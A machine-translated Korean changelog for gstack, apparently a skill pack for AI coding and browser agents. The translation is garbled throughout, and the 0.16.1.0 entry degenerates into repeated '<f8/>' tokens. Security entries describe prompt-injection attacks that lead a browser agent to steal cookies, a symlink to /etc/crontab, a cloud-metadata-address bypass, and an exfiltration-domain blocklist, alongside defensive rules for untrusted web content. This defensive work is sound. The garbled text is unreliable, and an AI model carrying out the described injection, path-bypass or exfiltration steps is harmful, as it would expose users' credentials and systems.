- **GBrain 라우터에 대한 기술 트리거.** 모든 38개의 기술 템플릿은 이제 `triggers:` 배열을 포함해 frontmatter, "debug this", "ship it", "brainstorm this"와 같은 멀티 단어 키워드가 있습니다. 이 힘 GBrain의 RESOLVER.md 기술 라우터 및 패스 `checkResolvable()` 검증. `voice-triggers:` (speech-to-text aliases)의 변형.
- **Hermes 뇌 지원.** Hermes는 GBrain를 가진 에이전트을 지금 뇌 특징을 자동적으로 얻게 설치했습니다. 해결자는 GBrain가 유효하지 않는 경우에, 진행하지 않는 경우에,) 비 GBrain Hermes가 우아하게 설치합니다.
- **slop:diff in /review.** 모든 코드 검토는 이제 `bun run slop:diff`를 고문 진단으로 실행하고, AI 코드 질 문제점을 붙잡기 (비행, 중복 요약, 중복적인 본)를 붙잡기 전에. 정보 만, 막기 결코.
- **Karpathy 호환성.** README 현재 gstack를 [Karpathy-style CLAUDE.md 규칙](https://github.com/forrestchang/andrej-karpathy-skills) (17K 별) 작업 흐름의 집행 층으로 위치합니다. 각 실패 모드를 gstack로 바꾸는 기술로 맵을 붙여줍니다.

### 변경
- **CEO 검토 HARD GATE 보강.** "Do NOT는 어떤 코드 변경을 만듭니다. 검토 만." 이제 모든 STOP 점 (12 위치)에서 반복해서, 다만 정상 아닙니다. Prompt 반복은 "시작" 실패 형태를 감소시킵니다.
- **Office-hours 디자인 doc 가시성.** 디자인 doc을 작성한 후, 기술이 이제 전체 경로가 다운스트림 기술(/plan-ceo-review, /plan-eng-review)을 인쇄할 수 있습니다.
- **조사 역사.** 각 조사는 이제 `type: "investigation"`와 영향을받은 파일 경로와 학습 시스템에 기록합니다. 같은 파일 표면의 미래 조사는 자동으로 발생합니다. 동일한 영역 = 건축 냄새에서 버그를 재발합니다.
- **Retro 비 git 컨텍스트.** `~/.gstack/retro-context.md`가 존재하면, 복고풍은 이제는 git 역사에 나타나지 않는 회의 메모, 캘린더 이벤트 및 결정에 대해 읽습니다.
- **Native OpenClaw 기술 향상.** 4개의 손으로 만들어진 클로호우호우(사무실 시간, ceo-review, 조사, 복고풍)는 이제 템플릿 개선을 위에 반영합니다.
- **Host 조사: 8에서 10.** Hermes와 GBrain는 Claude, Codex, 공장, Kiro, OpenCode, Slate, Cursor 및 OpenClaw에 결합합니다.

## [0.17.0.0] - 2026-04-14

### 추가
- **UX 행동 기초.** 모든 디자인 기술은 이제 사용자가 실제로 행동하는 방법에 대해 생각하고, 인터페이스가 어떻게 보일지. 공유 `{{UX_PRINCIPLES}}` 해결자 증류 스티브 크루그의 "Don't Make Me Think"를 액션 가능한 지도로: 스캔 행동, satisficing, goodwill reservoir, 탐색 wayfinding, 및 트렁크 테스트. /design-html, /design-shotgun, /design-review 및 /plan-design-review로 주사했습니다. 이제 디자인 리뷰는 "이 탐색은 혼란스럽습니다"문제, "비율은 4.3 : 1입니다."
- **디자인의 예심으로 짠 6개의 사용성 시험.** 이 방법론은 이제 트렁크 테스트 (이 사이트가 무엇인지 말해 줄 수 있습니다, 당신이 온 페이지, 그리고 어떻게 검색?), 3-Second 스캔 (사용자가 먼저 볼 수?), 페이지 영역 테스트 (각 섹션의 목적 이름을 지정할 수 있습니까?), 단어 수와 해피 토크 탐지 (이 페이지의 얼마나 많은 것은 "blah blah"입니까?), Mindless Choice Audit (각 click 느낌이 분명?), 사용자의 눈에 띄는 추적 (자세한).
- **1인용 narration 모드.** 디자인 리뷰 보고서는 이제 누군가가 사이트를 사용하는 유용성 컨설턴트처럼 읽었습니다. "나는이 페이지에서 찾고 있습니다 ... 내 눈은 로고로 이동 한 다음 전적으로 건너뛰는 텍스트 벽. 대기, 버튼이?" 반대로 사면 난간 : 에이전트가 특정 요소를 이름을 지정할 수 없다면, 그것은 백그라운드를 생성하고 있습니다.
- **`$B ux-audit` 명령.** 독립 UX 구조상 적출. 1개의 명령은 사이트 ID, 항법, headings, 상호 작용하는 성분, 원본 구획을 추출하고, 구조상 JSON로 지도를 검색합니다. 에이전트은 자료에 6개의 유용성 시험을 적용합니다. 성분 모자 (50의 두목, 100개의 연결, 200의 상호 작용하는, 50의 원본 구획)를 가진 순수한 자료 적출.
- **`snapshot -H` / `--heatmap` 플래그.** 컬러 코딩 오버레이 스크린 샷. JSON의 맵을 ref의 색상으로 전달합니다 (`green`/`yellow`/`red`/`blue`/`orange`/`gray`). 컬러 화이트리스트는 CSS 주사를 방지합니다. Composable: 어떤 기술든지 그것을 사용할 수 있습니다.
- **토큰 천장 시행.** `gen-skill-docs`는 생성한 SKILL.md가 100KB (~25K 토큰)를 초과하는 경우에 지금 경고합니다. 그것 degrades 에이전트 성과의 앞에 Catches 신속한 bloat.

### 변경
- **크루그의 항상/never 규칙** 디자인 단단한 규칙에 추가하십시오: 결코 placeholder-as 상표, 결코 뜨 headings, 항상 방문한 연결 구별, 결코 sub-16px 몸 원본. 이들은 기계적인 체크로 기존하는 AI 슬로프 blacklist에 결합합니다.
- **플랜 디자인리뷰 참조** 이제 Steve Krug, Ginny Redish (Words의 Letting Go), Caroline Jarrett (일 양식)과 Rams, Norman 및 Nielsen과 함께 포함됩니다.

## [0.16.4.0] - 2026-04-13

### 추가
- **쿠키 origin 핀닝.** 특정 도메인에 쿠키를 가져올 때 JS 실행은 이제 해당 도메인과 일치하지 않는 페이지에 차단됩니다. 이것은 신속한 주입이 공격자의 사이트에 탐색하고 수입 된 쿠키를 훔치는 `document.cookie`를 실행하는 공격을 방지합니다. Subdomain matching은 자동으로 작동 (`.github.com`를 허용하면 `api.github.com`)을 허용합니다. no 쿠키가 수입되면, 모든 것은 이전으로 작동합니다. @halbert04.에서 3 PRs.
- **명령 감사 로그.** 모든 검색 명령은 이제 `~/.gstack/.browse/browse-audit.jsonl`의 지속성 포렌식 트레일을 가져옵니다. 타임스탬프, 명령, args, 페이지 origin, 지속 가능성, 오류 및 쿠키가 수입했는지. 만, 결코 truncated, 서버 재시작을 살아남지 않습니다. 절대 명령 실행을 차단하지 않는 최고의 노력 쓰기. @halbert04에서.
- **쿠키 도메인 추적.** gstack 이제는 도메인 쿠키가 수입한 트랙을 추적합니다. origin를 위한 기초는 위에 핀으로 꼿습니다. `--domain`를 통해 직접 수입은 자동적으로 추적합니다. 새로운 `--all` 플래그는 가득 브로워 cookie를 기본 대신 명시적인 선택에서 가져옵니다.

### 고정
- **Symlink bypass 파일 쓰기.** `validateOutputPath`는 파일 자체가 아닌 symlinks의 부모 디렉토리를 검사합니다. `/tmp/evil.png` `/etc/crontab`에 `/etc/crontab`에 symlink는 부모 `/tmp`가 안전했기 때문에 검증을 통과했습니다. 이제는 쓰기 전에 `lstatSync` 파일로 검사합니다. @Hybirds에서.
- **쿠키-import 경로 우회.** 두 가지 문제: 모든 검증을 우회하는 상대 경로 (`path.isAbsolute()` 게이트는 `sensitive-file.json`를 통해), 그리고 symlink 해결책은 누락되었습니다 (`path.resolve` 없이 `realpathSync`). 이제 절대로 해결하고, symlinks를 해결하고, 안전한 감독에 대하여 검사합니다. @urbantech에서.
- **설정 스크립트에서 Shell Injection.** `gstack-settings-hook`는 `bun -e` JavaScript 블록으로 직접 파일 경로를 곱합니다. 인용문이 JS 문자열 컨텍스트를 파쇄하는 경로입니다. 이제 환경 변수 (`process.env`)를 사용합니다. 체계적인 감사는 이 스크립트 만 취약했습니다. @garagon에서.
- **양식 필드 압흔 누출.** 스냅샷은 `type="password"` 필드에만 적용된다. `csrf_token`, `api_key`, `session_id`라는 숨겨진 텍스트 필드는 LLM 컨텍스트에 노출되지 않은 것으로 나타났습니다. 이제 필드 이름과 민감한 패턴에 대한 ID를 확인합니다. @garagon에서.
- **신속한 주입을 학습하십시오.** 3개의 고침: 입력 유효성 검사 (type/key/confidence 수당), 주입 본 탐지 통찰력 분야 (블록 “이전 지시” 등등을), 및 크로스 프로젝트 신뢰 문 (사용자 통계 학습 크로스 프로젝트 경계). @Ziadstr에서.
- **IPv6 메타데이터 우회.** URL 생성자는 `::ffff:169.254.169.254`를 `::ffff:a9fe:a9fe` (hex)로 정상화하고, 차단제에 있지 않은. 두 개의 hex-encoded 형태를 추가했습니다. @mehmoodosman에서.
- **세션 파일 세계 읽기.** `/tmp`의 디자인 세션 파일은 default 허가 (0644)로 만들어졌습니다. 이제 0600 (owner-only). @garagon에서.
- **설정에 있는 언 lockfile.** `bun install`는 지금 `--frozen-lockfile`를 사용하여 뜨 틈새 범위를 통해 공급망 공격을 방지하기 위하여 사용합니다. @halbert04에서.
- **Dockerfile chmod 수정.** 제거된 중복 재발 `chmod -R 1777 /tmp` (파일에 반복적인 끈끈한 조금은 no 정의된 행동이 있습니다). @Gonzih에서.
- **cookie 가져오기에서 /tmp를 디코딩 합니다.** `cookie-import-browser`는 `os.tmpdir()` 대신 `/tmp`를, Windows 지원을 끊기.

## 보안
- 닫히는 14 보안 문제 (#665-#675, #566, #479, #467, #545) 이전에 파도에 고정되었지만 여전히 GitHub에서 열립니다.
- 17 커뮤니티 보안 PRs with Thank-you 메시지 및 commit 참조.
- 보안 파 3 : 12 수정, 7 기여자. @Hybirds, @urbantech, @garagon, @Ziadstr, @halbert04, @mehmoodosman, @Gonzih에 큰 감사.

## [0.16.3.0] - 2026-04-09

### 변경
- **AI 슬로프 정리.** Ran [slop-scan의](https://github.com/benvinegar/slop-scan)는 100개의 발견에서 떨어졌습니다 (2.38 득점/file) 90의 발견 (1.96 득점/file). 좋은 부분: `safeUnlink()` 및 `safeKill()`는 진짜 버그를 붙잡는 유틸리티 (swallowed EPERM는 폐쇄에 있는 침묵하는 자료 손실 위험이었습니다). `safeUnlinkQuiet()`는 던지는 것은 삼키기 보다는 더 나쁘게 합니다. `isProcessAlive()`는 빨강/p>를 가진 공유된 지원으로 Windows를 추출했습니다. Typed 예외 캐치 (TypeError, DOMException, ENOENT)은 시스템 경계 코드에서 빈 캐치를 대체합니다. 우리가 시도하고 회신 한 부분 : 오류 메시지에 문자열 매칭은 브리틀, 확장 캐치 앤 로그가 정확하고, 패스 투 - 래퍼 코멘트는 linter Gaming이었습니다. 우리는 AI-coded이며 자랑스럽게 생각합니다. 목표는 코드 품질이 아니며 숨겨지지 않습니다.

### 추가
- **`bun run slop:diff`**는 NEW slop-scan finds가 branch 대 주에 소개된 것을 보여줍니다. 줄 수소 과민한 비교 그래서 이동한 코드는 거짓 긍정적인 긍정을 창조하지 않습니다. `bun test` 후에 자동적으로 달립니다.
- **Slop-scan 사용 가이드** CLAUDE.md: NOT를 수정하기 위하여 NOT를 통해 (리터 게임)를 고치는 것을 무엇. 실용 기능 참고 테이블을 포함합니다.
- **디자인 doc** 미래 슬로프-scan 통합 `/review` 및 `/ship` 기술 (`docs/designs/SLOP_SCAN_FOR_REVIEW_SHIP.md`).

## [0.16.2.0] - 2026-04-09

### 추가
- **지금 사무실 시간은 당신을 기억합니다.** 닫히는 경험은 당신이 행해진 몇 세션을 기반으로 합니다. 처음: 전체 YC 기쁜과 설립자 자원. 세션 2-3: "Welcome back. 마지막 시간에 당신은 [당신의 프로젝트]에 작동했다. 어떻게 그것은 가고?" 세션 4-7: 전체 여행, 축적된 신호 가시성 및 자동 생성 된 빌더 여행의 전반에 아크 수준의 콜백. 세션 8+: 데이터 자체에 대해 이야기합니다.
- **Builder 프로필**는 단일 부록 전용 세션 로그에서 사무실 시간 여행을 추적합니다. 신호, 디자인 문서, 할당, 주제 및 리소스는 모두 하나의 파일에서 보여집니다. No 분할-브라인 상태, no 분리 설정 키.
- **Builder-to-founder 판결**는 창시적인 신호를 축적한 반복적인 빌더 모드 사용자를 위해. Evidence-gated: 3+ 빌더 세션을 통해 5+ 신호를 보았을 때만 트리거합니다. 피치가 아닙니다. 관측.
- **여행에 적합한 자원.** 정적 풀에서 범주 매칭 대신, 자원은 이제 축적 된 세션 컨텍스트와 일치합니다. "당신은 3 세션을위한 핀 기술 아이디어에 그것을 결정했습니다 ... Tom Blomfield는 이러한 종류의 지속력을 정확히 기반으로 Monzo를 내장했습니다."
- **Builder 여행 개요** 세션 5+에서 자동 생성 및 브라우저에서 열립니다. 여행의 narrative arc, 데이터 테이블이 아닙니다. 두 번째 사람에 서면, 세션을 통해 말했듯이 특정 것들을 참조.
- **글로벌 리소스 dedup.** 자원 링크가 이제 전 세계 (프로젝트에 아닙니다)를 데드 업하므로, 다시 포지를 전환하지 마십시오. 각 링크는 한 번만 보여줍니다.

### 고정
- package.json 버전은 VERSION 파일과 동기화되어 있습니다.

## [0.16.1.0] - 2026-04-08

### 고정
- 쿠키 선택기 no 더 긴 검색 서버 auth 토큰을 누출합니다. 이전 cookie 테이너 페이지를 열고 token 소스에서 마스터 베어 token를 노출하고 로컬 프로세스를 추출하고 브라우저 세션에서 임의 JavaScript를 실행합니다. 이제 HttpOnly 세션 쿠키와 함께 일회성 코드 교환을 사용합니다. token는 HTML, HTML, JavaScript, CVSS, <f8/>, <f8/>, <f8/>, <f8/>, <f7/>, <f7/>, <f8>, <f8>, <f7>, <f8>, <f7>, <f8>, <f8>, <f8>, <f8>, <f7>, <f7>, <f>, <f>, <f8>, <f8>, <f8>, <f>, <f>, <f>, <f>, <f>, <f7>, <f>, <f>, <f7>, <f>, <f>, <f>, <f>, <f>, <f>, <f>, <f>, <f>, <f>, <f>, <f>, <f>, <f>,

## [0.16.0.0] - 2026-04-07

### 추가
- **브라우저 데이터 플랫폼.** 6개의 새로운 검색 명령은 gstack의 AI 에이전트을 위한 가득 차있는 긁는 그리고 자료 적출 도구로 "버튼을 누르는 것에서 gstack 브라우저를 돌리.
- `media` 명령: 페이지에 모든 이미지, 비디오 및 오디오 요소를 발견하십시오. URL, 차원, srcset, 게으른 로드 상태, 그리고 HLS/DASH 스트림을 검색합니다. `--images`, `--videos`, `--audio`, 또는 CSS selector와 범위를 반환합니다.
- `data` 명령: 페이지에 포함된 구조화된 자료 추출. JSON-LD (제품 가격, 조리법, 사건), 열린 그래프, Twitter 카드 및 메타 태그. 하나의 명령은 DOM 스크랩의 50 줄을 가지고 사용하는 것을 의미합니다.
- `download` 명령: 브라우저의 세션 쿠키를 사용하여 디스크에 URL 또는 `@ref` 요소가 붙습니다. in-page base64 변환을 통해 blob URL을 처리하십시오. `--base64` 플래그는 원격 에이전트에 대한 인라인 데이터 URI를 반환합니다. HLS/DASH를 감지하고 침묵적으로 실패하는 대신 yt-dlp를 사용하도록 알려줍니다.
- `scrape` 명령: 대량 다운로드 페이지의 모든 미디어. `media` discovery + `download`를 결합하여 URL deduplication, 구성 제한 및 기계 소비를 위한 `manifest.json`.
- `archive` 명령: CDP를 통해 MHTML로 전체 페이지를 저장합니다. 모든 리소스를 가진 한 개의 명령, 전체 페이지.
- `scroll --times N`: 무한한 피드 콘텐츠 로딩을 위한 자동화된 반복된 스크롤. `--wait`를 가진 스크롤 사이 설정가능한 지연.
- `screenshot --base64`: 파일 경로 대신 인라인 데이터 URI로 스크린 샷을 반환합니다. 원격 에이전트에 대한 두 단계 스크린 샷 - 그 후 파일 보호 춤을 삭제합니다.
- **네트워크 응답 몸 붙잡음.** `network --capture`는 API 응답 몸 이렇게 에이전트을 분리합니다 fragile DOM 긁는 대신 DOM 구조상으로 JSON를 얻습니다. URL 본 (`--filter graphql`)에 의하여 여과기는, JSONL (`--export`)로 수출해, 보정 (`--bodies`)를 보십시오. 자동적인 eviction를 가진 50MB 크기 모자를 씌운 완충기.
- `GET /file` 엔드포인트: 원격 페어링 에이전트는 HTTP 이상 다운로드된 파일 (이미지, 스크랩 미디어, 스크린샷)을 검색할 수 있습니다. TEMP_DIR 프로젝트 파일 압축을 방지하기 위해만 하면 됩니다. Bearer token auth, MIME 탐지, `Bun.file()`를 통해 제로 복사 스트리밍.

### 변경
- 페어링 에이전트는 이제 default (read+write+admin+meta)에 의해 전체 액세스를 얻을 수 있습니다. 신뢰 경계는 쌍식 의식, 범위가 아닙니다. click 어떤 버튼도 `js`를 실행할 수 있는 의미 있는 공격 표면을 얻지 못하는 에이전트은, `--control`를 통해 새로운 `control` 범위로 이동된 브라우저 넓은 파괴적인 명령 (정지, 재시작, 단선), `--control`를 통해 여전히 선택된 것입니다.
- `path-security.ts` 모듈을 공유하기 위해 추출된 경로 검증. 약간 다른 구현을 가진 세 파일에 걸쳐 복제되었습니다. 이제 `validateOutputPath`, `validateReadPath`, `validateTempPath`와 같은 진실의 한 소스.

## [0.15.16.0] - 2026-04-06

### 추가
- TabSession을 통해 Per-tab state isolation. 각 브라우저 탭은 이제 자체 ref 지도, snapshot 기본, 프레임 컨텍스트가 있습니다. 이전에는 BrowserManager에서 글로벌이었고, snapshot refs를 의미하며, 한 탭에서 다른 탭으로 콜드할 수 있었습니다. 이것은 평행 멀티탭 작업의 기초입니다.
- BROWSER.md의 API 모양, 디자인 결정 및 사용법 본을 가진 BROWSER.md에 있는 배치 엔드포인트 문서.

### 변경
- read-commands, write-commands, meta-commands 및 snapshot의 핸들러 서명은 이제 글로벌 운영을 위한 탭션 및 BrowserManager에 대해 탭션을 수락합니다. 이 분리는 브라우저에 의해 탭-경로 대를 표시하는 것을 명시합니다.

### 고정
- 코덱 - 리뷰 E2E 테스트는 전체 55KB SKILL.md (1,075 라인)를 복사했으며, 8 번의 읽기 통화를 사용해서 실제 검토에 도달하기 전에 15 회전 예산을 소진했습니다. 이제 리뷰 리버스트 섹션 (~6KB/148 라인) 만 추출하여 8에서 1까지의 절단 통화를 절단합니다. 테스트는 141에서 전달하기 위해 영구 타임 아웃에서 이동합니다.

## [0.15.15.1] - 2026-04-06

### 고정
- 15초 후 페어 에이전트 터널 방울. 검색 서버는 부모 프로세스 ID 및 CLI 종료시 자동 종료를 모니터링했습니다. 이제 쌍 에이전트 세션은 부모 watchdog을 비활성화하여 서버와 터널은 살아있었습니다.
- `$B connect` "domains는 정의되지 않습니다." 헤더 상태의 stray 변수 참조는 제대로 초기화에서 GStack 브라우저를 방지했습니다.

## [0.15.15.0] - 2026-04-06

커뮤니티 보안 파 : 4 명의 기여자로부터 8 명의 PR, 모든 수정은 공동 저자로 크레딧.

### 추가
- 토큰의 쿠키 값 중복, API 키, JWT, 세션 비밀 `browse cookies` 출력. 비밀 no 더 긴 Claude의 컨텍스트에 나타납니다.
- IPv6 ULA 접두사 차단 (fc00::/7) URL 검증. 리터 `fd00::`가 아닌 전체 고유의 지역 범위를 커버합니다. `fcustomer.com`와 같은 호스트 이름은 false-positived가 아닙니다.
- sidebar 에이전트에 대 한 신호 취소. 한 탭의 에이전트를 중지 no 더 긴 모든 탭을 죽.
- 검색 서버의 부모 프로세스 watchdog. Claude Code 종료시, 또는 브라우저 프로세스가 15 초 이내에 자체 종료됩니다.
- README (script + 수동 제거 단계)에 있는 제거 지시.
- CSS 값 검증 블록 `url()`, `expression()`, `@import`, `javascript:`, `data:` 스타일 명령에서 CSS 주입 공격을 방지합니다.
- `stateFile`와 `cwd`의 경로 트래버스를 통해 입력 스키마 유효성 검사(`isValidQueueEntry`)를 입력합니다.
- Viewport 차원 클램핑 (1-16384) 및 대기 시간 클램핑 (1s-300s)는 OOM를 방지하고 대기 대기를 런닝.
- `cookie-import`의 쿠키 도메인 유효성 검사는 단면적 cookie 주사를 방지합니다.
- DocumentFragment 기반 탭은 사이드바에서 전환합니다 (안 HTML 라운드 트립 XSS 벡터를 대체합니다).
- `pollInProgress` reentrancy guard는 손상 상태에서 동시 채팅 설문 조사를 방지합니다.
- 4개의 시험 파일에 걸쳐 새로운 보안 회귀 시험의 750+ 선.
- Supabase 마이그레이션 003: 열 수준 GRANT 제한 anon UPDATE (last_본, gstack_version, os) 만.

### 고정
- Windows: `extraEnv`는 Windows 발사기 ( 침묵으로 떨어졌다)에 통과합니다.
- Windows: 환영 페이지는 `about:blank` 대신 HTML 리디렉션 (fixes ERR_UNSAFE_REDIRECT)를 인라인 HTML를 봉사합니다.
- Headed 모드: auth token는 근원 우두머리 없이 조차 돌려보내었습니다 (Playwright Chromium 연장을 만드십시오).
- `frame --url` 이제 RegExp(ReDoS fix)를 구성하기 전에 사용자 입력을 탈출합니다.
- 스크린 샷 경로 검증은 이제 symlinks (symlink traversal을 통해 우회할 수 있음)을 해결합니다.
- Auth token는 건강 방송에서 제거해, 대신에 표적으로 한 `getToken` 핸들러를 통해 배달했습니다.
- `/health` 엔드포인트 no는 `currentUrl` 또는 `currentMessage`를 더 긴 노출합니다.
- Session ID 파일 경로에 사용하기 전에 검증된 (active.json를 통해 경로 트레이널을 실행합니다.
- SIGTERM/SIGKILL 사이드바 에이전트 타임아웃 핸들러 (바 `kill()`)의 에스컬레이션.

### 기여자
- 0o700/0o600의 허가 (서버, CLI, sidebar-agent)로 만든 큐 파일.
- `escapeRegExp` 유틸리티는 meta-commands에서 수출했습니다.
- 로컬 호스트, .internal, 그리고 metadata 도메인에서 state load filter 쿠키를 사용합니다.
- Telemetry sync는 설치 추적에서 upsert 오류를 로그.

## [0.15.14.0] - 2026-04-05

### 고정

- **`gstack-team-init` 이제는 공급 업체 gstack 복사를 감지하고 제거합니다.** repo 를 `.claude/skills/gstack/` 으로 gstack 를 실행할 때, 자동으로 공급 업체 복사를 제거하고, git에서 추적하지 않고 `.gitignore` 로 추가합니다. No 은 더 많은 stale 공급 업체 사본을 글로벌 설치 shadowing.
- **`/gstack-upgrade` 팀 모드를 존중합니다.** Step 4.5는 이제 `team_mode` config를 확인합니다. 팀 모드에서, 공급 업체 사본은 synced 대신 제거됩니다. 글로벌 설치가 진실의 단일 소스이기 때문에.
- **`team_mode` 구성 키.** `./setup --team`와 `./setup --no-team`는 이제 전용 `team_mode` 구성 열쇠를 놓아서 업그레이드 기술은 auto-upgrade 활성화를 갖는 다만에서 팀 형태를 믿을 수 있습니다.

## [0.15.13.0] - 2026-04-04. 팀 모드

팀은 이제 동일한 gstack 버전에 모든 개발자를 자동으로 유지할 수 있습니다. No 더 많은 공급 업체 342 파일이 다시포에 있습니다. No 더 많은 버전은 지점을 가로지르는 편입니다. No 더 많은 "who upgraded gstack 마지막?" 슬랙 스레드. 하나의 명령은, 모든 개발자가 현재입니다.

디자인에 대한 자비스 Friedman에 모자 팁.

### 추가

- **`./setup --team`.**는 `SessionStart` 걸이를 `~/.claude/settings.json`에 각각 Claude Code 회의의 시작에 자동 갱신 gstack 기록합니다. 배경 (zero latency)에서, throttled에 한 번/hour, 네트워크 실패 안전, 완전하게. 침묵하는 `./setup --no-team`는 그것을 반전합니다.
- **`./setup -q` / `--quiet`.** 모든 정보 출력을 억제합니다. 세션 업데이트 후크에 사용하지만 CI 및 스크립트 설치에 유용합니다.
- **`gstack-team-init` 명령.** 두 가지 맛의 리포 레벨 부츠 스트랩 파일을 생성 : `optional` (일반 CLAUDE.md 제안, 개발자 당 한 번의 제안) 또는 `required` (CLAUDE.md 시행 + PreToolUse Hook은 gstack 설치없이 작업을 차단합니다.
- **`gstack-settings-hook` 도움자.** DRY 유틸리티를 추가 /removing 후크 Claude Code의 `settings.json`. 원자는 (.tmp + 이름을 바꾸십시오) 손상을 방지합니다.
- **`gstack-session-update` 스크립트.** 세션시작 후크 대상. 배경 포크, PID- stale Recovery, `GIT_TERMINAL_PROMPT=0`를 사용하여 credential 프롬프트 걸프를 방지하고 `~/.gstack/analytics/session-update.log`에 디버그 로그를 방지합니다.
- **사전 침입에 대한 납세.** 모든 기술이 이제 프로젝트의 공급 업체 gstack 사본을 감지하고 팀 모드로 일회성 마이그레이션을 제공합니다. "당신은 그것을해야 할 필요?"는 "그는 4 수동 단계입니다."

### 변경

- **공급은 퇴행합니다.** README no 더 긴 복사 gstack 당신의 repo로. Global install + `--team`는 방법입니다. `--local` 플래그는 여전히 작동하지만, 퇴행 경고를 인쇄합니다.
- **Uninstall는 걸이를 청소합니다.** `gstack-uninstall` 이제 `~/.claude/settings.json`에서 SessionStart Hook을 제거한다.

## [0.15.12.0] - 2026-04-05. 내용 보안 : 4-Layer Prompt 주입 방어

브라우저를 다른 AI 에이전트를 `/pair-agent`로 공유하면 에이전트가 웹 페이지를 읽을 수 있습니다. 웹 페이지는 신속한 주입 공격을 포함 할 수 있습니다. 숨겨진 텍스트, 가짜 시스템 메시지, 제품 리뷰의 소셜 엔지니어링. 이 릴리스는 방어의 4 층을 추가하므로 원격 에이전트는 안전하게 속임수없이 신뢰할 수없는 사이트를 검색 할 수 있습니다.

### 추가

- **콘텐츠 봉투 포장.** 각 페이지는 scoped 에이전트에 의해 `═══ BEGIN UNTRUSTED WEB CONTENT ═══`/ `═══ END UNTRUSTED WEB CONTENT ═══` 감적 감싸입니다. 에이전트의 지시 구획은 이 감적 안쪽에 발견한 지시를 따르지 않는 것을 결코 말합니다. 페이지 내용에 있는 봉투 감적은 경계선 공격을 방지하기 위하여 0 폭 공간으로 탈출됩니다.
- **숨겨진 요소 벗기는.** CSS-hidden 요소 (opacity < 0.1, 글꼴 크기 < 1px, 오프 스크린 포지셔닝, 동일한 fg/bg 색깔, 클립 방향, 가시:숨겨진) 및 ARIA 상표 주입은 원본 산출에서 검출되고 벗겨집니다. 페이지 DOM는 결코 mutated 결코. clone를 이용하십시오 + 텍스트 추출, CSS 스냅 샷을 위한 주입.
- **데이터 표시.** 텍스트 명령 출력은 세션-경로 워터마크 (4-char 임의 마커 삽입 0-width 문자)를 가져옵니다. 콘텐츠가 어딘가에 나타나면, 마커가 세션으로 돌아갑니다. `text` 명령에만 적용되며 `html` 또는 `forms`와 같은 구조화된 데이터가 아닙니다.
- **내용 필터 후크.** `BROWSE_CONTENT_FILTER` env var (off/warn/block, default: warn)를 가진 Extensible 여과기 파이프라인. 붙박이 URL 차단표는 requestbin, pipedream, webhook.site를 붙잡고, 다른 알려진 exfiltration 도메인을 붙잡습니다. 당신의 자신의 규칙을 위한 주문 여과기를 등록하십시오.
- **Snapshot 분할 형식.** Scoped 토큰은 snapshot: 신뢰할 수 있는 `@ref` 상표 (click/fill)를 믿을 수 없는 내용 봉투의 위쪽으로 얻습니다. 이 에이전트는 refs가 사용되기 위해 안전한 것을 알고 있으며, 콘텐츠는 무수합니다. 루트 토큰은 변하지 않습니다.
- **SECURITY 섹션에서 명령어 블록.** 원격 에이전트는 이제 신뢰할 수있는 섹션에서 @refs를 사용하여 일반적인 주입 구문 및 지도 목록과 함께 신속한 주사에 대한 명시적 경고를받습니다.
- **47개의 콘텐츠 보안 테스트.**는 사슬 안전, 봉투 escaping, ARIA 주입 탐지, 거짓 긍정적인 체크 및 결합된 공격 대본을 가진 4개의 층을 덮습니다. 시험을 위한 4개의 주입 정착물 HTML 페이지.

### 변경

- `handleCommand`는 `handleCommandInternal` (구조화된 결과) + 얇은 HTTP 래퍼로 재개했습니다. 사슬 subcommands는 그것을 우회하는 대신에 가득 차있는 안전 파이프라인 (경경, 도메인, 탭 소유권, 내용 감싸기)를 통해 지금 노선을 갑니다.
- `attrs` `PAGE_CONTENT_COMMANDS` (ARIA 속성 값은 현재 비신뢰되지 않은 내용으로 감싸고 있습니다).
- `handleCommandInternal` 응답 경로에 있는 1개의 위치에서 중앙 집중된 내용 감싸기. 6개의 외침 위치에 걸쳐 조각되었습니다.

### 고정

- `snapshot -i` 이제 자동 사용 cursor-interactive 엘리먼트 (dropdown items, Popover options, custom listboxes)를 포함합니다. 이전으로 `-C`를 별도로 통과해야 했습니다.
- 부동 용기 내부의 스냅 샷 (React 포털, Radix Popover, 뜨 UI) 그들은 ARIA 역할이있을 때.
- Dropdown/menu 항목 `role="option"` 또는 `role="menuitem"` 안쪽 팝업은 이제 캡처되고 태그가 `popover-child`.
- Chain 명령은 이제 `newtab` (`goto`를 검사하는 것만)에 도메인 제한을 확인합니다.
- Nested chain 명령은 거절 (recursion guard는 체인 - 안 체인을 방지합니다).
- 체인 하위 콤마드에 대한 공제 비율 (체인은 1 요청으로 계산, N).
- 터널 liveness 검증: `/pair-agent` 이제는 원격 에이전트에 도달하는 데 죽은 터널 URL을 방지하기 전에 터널을 조사합니다.
- `/health`는 확장 인증( 터널을 끄는 경우) 로컬 호스트의 token를 제공합니다.
- 모든 16 사전 검사 테스트 실패 고정 (쌍 시일 기술 준수, 황금 파일 기본, 호스트 연기 테스트, 링크 테스트 타임 아웃).

## [0.15.11.0] - 2026-04-05

### 변경
- `/ship` 재 실행은 이제 모든 검증 단계 (테스트, 적용 감사, 검토, adversarial, TODOS, 문서 릴리스)를 실행하지 않고 실행합니다. 만 동작 (push, PR 생성, VERSION 범프)는 공명입니다. Re-running `/ship`는 "완전한 검수 목록을 다시 실행합니다."
- `/ship` 이제는 사전 랜딩 검토, 일치 `/review`의 깊이에 매칭된 검토 도중 풀 검토 육군 전문가 파견 (테스트, 유지, 보안, 성과, 자료 이동, api-contract, 디자인, 빨간 팀)를 실행합니다.

### 추가
- `/ship`: 이전에 `/review` 또는 `/ship`를 이미 건너뛰는 사용자를 찾아내는 것은 재 실행에 자동적으로 억압됩니다 (관련 코드가 변경되지 않는).
- PR 몸은 `/document-release` 후에 새로 고침합니다: PR 몸은 docs commit를 포함하기 위하여 재 편집됩니다, 그래서 항상 진짜로 마지막 국가를 반영합니다.

### 고정
- 육군 diff 크기 허리학 지금 삽입 + 탈수 (자체 삽입 전용, 놓인 deletion-heavy refactors)를 조사합니다.

### 기여자
- `{{CROSS_REVIEW_DEDUP}}`의 DRY와 `/ship` 사이 `/review`를 공유하기 위하여 교차하는 전망 dedup를 추출했습니다.
- 육군 단계 번호는 `ctx.skillName` (선을 통해 per-skill에 적응합니다: 3.55/3.56, 검토: prose 참고를 포함하여 4.5/4.6),.
- 새로운 배 템플릿 콘텐츠를 위한 3 회 회 회귀 가드 테스트 추가.

## [0.15.10.0] - 2026-04-05. Native OpenClaw Skills + ClawHub Publishing

